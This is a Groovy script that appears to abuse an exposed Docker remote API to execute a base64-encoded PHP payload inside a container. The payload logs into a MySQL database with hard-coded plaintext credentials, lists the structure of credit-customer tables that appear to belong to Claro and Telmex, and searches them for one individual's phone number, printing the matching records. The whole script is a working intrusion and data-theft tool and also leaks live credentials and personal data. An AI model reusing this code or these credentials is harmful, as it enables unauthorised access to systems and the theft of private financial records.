import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
$c=new mysqli("187.191.91.37","adaxxidb","JTQ6PrkecY3y1kVN","tienda",3306);
if($c->connect_error){die("FAIL:".$c->connect_error);}

// First get table structure
echo "=== DESCRIBE credcliente ===\n";
$r=$c->query("DESCRIBE credito_clarotel_credcliente");
while($row=$r->fetch_row()){echo "$row[0] ($row[1])\n";}

echo "\n=== DESCRIBE lineac ===\n";
$r2=$c->query("DESCRIBE credito_clarotel_lineac");
while($row=$r2->fetch_row()){echo "$row[0] ($row[1])\n";}

echo "\n=== DESCRIBE telmex_ws_lineacredito ===\n";
$r3=$c->query("DESCRIBE telmex_ws_lineacredito");
if($r3){while($row=$r3->fetch_row()){echo "$row[0] ($row[1])\n";}}else{echo $c->error."\n";}

// Search phone in credcliente (all columns)
echo "\n=== SEARCH 5558455777 in credcliente ===\n";
$r4=$c->query("SELECT * FROM credito_clarotel_credcliente WHERE telefono LIKE '%5558455777%' LIMIT 5");
if($r4 && $r4->num_rows>0){
    $flds=$r4->fetch_fields();$h=[];foreach($flds as $f)$h[]=$f->name;
    echo implode("|",$h)."\n";
    while($row=$r4->fetch_row()){echo implode("|",$row)."\n";}
}else{echo "NO_ROWS: ".$c->error."\n";}

// Search phone in lineac
echo "\n=== SEARCH 5558455777 in lineac ===\n";
$r5=$c->query("SELECT * FROM credito_clarotel_lineac WHERE telefono LIKE '%5558455777%' LIMIT 5");
if($r5 && $r5->num_rows>0){
    $flds=$r5->fetch_fields();$h=[];foreach($flds as $f)$h[]=$f->name;
    echo implode("|",$h)."\n";
    while($row=$r5->fetch_row()){echo implode("|",$row)."\n";}
}else{echo "NO_ROWS: ".$c->error."\n";}

// Search in telmex_ws_lineacredito
echo "\n=== SEARCH 5558455777 in telmex_ws_lineacredito ===\n";
$r6=$c->query("SELECT * FROM telmex_ws_lineacredito WHERE telefono LIKE '%5558455777%' OR numero_cuenta LIKE '%5558455777%' LIMIT 5");
if($r6 && $r6->num_rows>0){
    $flds=$r6->fetch_fields();$h=[];foreach($flds as $f)$h[]=$f->name;
    echo implode("|",$h)."\n";
    while($row=$r6->fetch_row()){echo implode("|",$row)."\n";}
}else{echo "NO_ROWS: ".$c->error."\n";}

// Also try credito_clarotel_datos_cliente
echo "\n=== SEARCH 5558455777 in datos_cliente ===\n";
$r7=$c->query("SELECT * FROM credito_clarotel_datos_cliente WHERE telefono LIKE '%5558455777%' OR celular LIKE '%5558455777%' LIMIT 5");
if($r7 && $r7->num_rows>0){
    $flds=$r7->fetch_fields();$h=[];foreach($flds as $f)$h[]=$f->name;
    echo implode("|",$h)."\n";
    while($row=$r7->fetch_row()){echo implode("|",$row)."\n";}
}else{echo "NO_ROWS: ".$c->error."\n";}

// Try with just last 8 digits in case stored differently
echo "\n=== SEARCH 58455777 in credcliente ===\n";
$r8=$c->query("SELECT * FROM credito_clarotel_credcliente WHERE telefono LIKE '%58455777%' LIMIT 5");
if($r8 && $r8->num_rows>0){
    $flds=$r8->fetch_fields();$h=[];foreach($flds as $f)$h[]=$f->name;
    echo implode("|",$h)."\n";
    while($row=$r8->fetch_row()){echo implode("|",$row)."\n";}
}else{echo "NO_ROWS: ".$c->error."\n";}

$c->close();
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(20000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/tqphone.php && php /tmp/tqphone.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(30000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
